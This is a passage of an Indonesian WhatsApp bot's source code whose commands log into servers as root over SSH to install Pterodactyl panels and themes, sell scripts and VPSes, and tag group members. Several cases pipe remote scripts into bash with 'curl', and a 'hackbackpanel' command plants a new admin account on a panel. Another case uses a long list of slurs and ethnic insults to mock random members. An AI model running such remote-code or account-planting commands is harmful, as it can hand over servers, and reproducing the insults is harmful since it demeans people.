pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285624297893\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================
case 'sunda':
case'gabut':
case 'caper':
case 'setan':
case 'preman':
case 'anj':
case 'beban':
case 'tolol':
case 'goblog':
case 'goblok':
case 'idiot':
case 'gay':
case 'jomok':
case 'bajingan':
case 'munafik':
case 'kontol':
case 'yatim':
case 'poke':
case 'pembokep':
case 'hitam':
case 'hytam':
case 'dark sistem':
case 'bego':
case 'jawa':
case 'wibu':
case 'stress':
case 'miskin':
case 'cantik':
case 'manis':
case 'babi':
case 'ganteng':
case 'cina':
case 'atheis':
case 'papua':
case 'nigga':
case 'pengentot':
case 'seksi':
case 'kawai':
case 'tercindo':
case 'tampan':
case 'fembokef':
case 'pengocok':
case 'cabul':
case 'fuckboy':
case 'playboy':
case 'sange':
case 'sangean':
case 'hot': {
const participantss = m.isGroup ? await groupMetadata.participants : ''
            let member = participantss.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
Ditss.sendMessage(m.chat,
{ text: `orang ${command} disini adalah @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${command} yang di tag`,
"body": `hiburan🗿🦚`,
"previewType": "PHOTO",
"thumbnailUrl": `https://img101.pixhost.to/images/50/545939688_ditss.jpg`,
"thumbnailUrl": `https://img101.pixhost.to/images/50/545939688_ditss.jpg`,
"sourceUrl": `https://whatsapp.com/channel/0029Vb7LVEnHltYCWuCFAt0y/1772`}}},
{ quoted: qkontak})        
            }
            break
//=====
case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//================================================================================

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

//================================================================================

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//===>
case 'npm': case 'npmsearch': {
	if (!text) throw 'Input Query'
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	Ditss.sendMessage(m.chat, {
		react: {
			text: '⚙️',
			key: m.key,
		}
	})
	let { objects } = await res.json()
	if (!objects.length) return reply(`Query "${text}" not found :/`)
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	reply(`乂 *N P M  S E A R C H*\n\n` + txt)
}
break
//================================================================================

case "subdomain": case "subdo": {
const obj = Object.keys(global.subdomain)
let count = 0
let teks = `
 *#- List all domain server*\n`
for (let i of obj) {
count++
teks += `\n* ${count}. ${i}\n`
}
teks += `\n Contoh : *.domain 2 host|ipvps*\n`
m.reply(teks)

}
break

//================================================================================

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//================================================================================

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ditss.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ditss.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//================================================================================

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

//================================================================================

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Ditss.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

//================================================================================

case "buyscript": case "buysc": {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

let teks = `
 *乂 List script bot yang tersedia*

*1. Simple Bot V3*
* *Type :* Case X Plugins
* *Size File :* 1mb
* *Harga :* Rp35.000

*2. Pushkontak Simpel*
* *Type :* Case
* *Size File :* 909kb
* *Harga :* Rp25.000

Contoh Penggunaan : *.buysc* 1
`
if (!text) return m.reply(teks)
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "20000"
    Obj.namaSc = "Script Simple Bot V3"
    } else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "35000"
    Obj.namaSc = "Script Pushkontak Simpel"  
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Ditss.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Ditss.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Ditss.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await Ditss.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await Ditss.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await Ditss.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyvps": {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

let teks = `
 *乂 List paket vps yang tersedia*
 
*1.* Ram 2 & Cpu 1
*Harga Rp25.000*

*2.* Ram 4 & Cpu 2
*Harga Rp35.000*

*3.* Ram 8 & Cpu 4
*Harga Rp45.000*

*4.* Ram 16 & Cpu 4
*Harga Rp55.000*

 Contoh penggunaan : *.buyvps* 1
`
if (!text) return m.reply(teks)
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "25000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "35000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "45000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "55000"
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Ditss.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
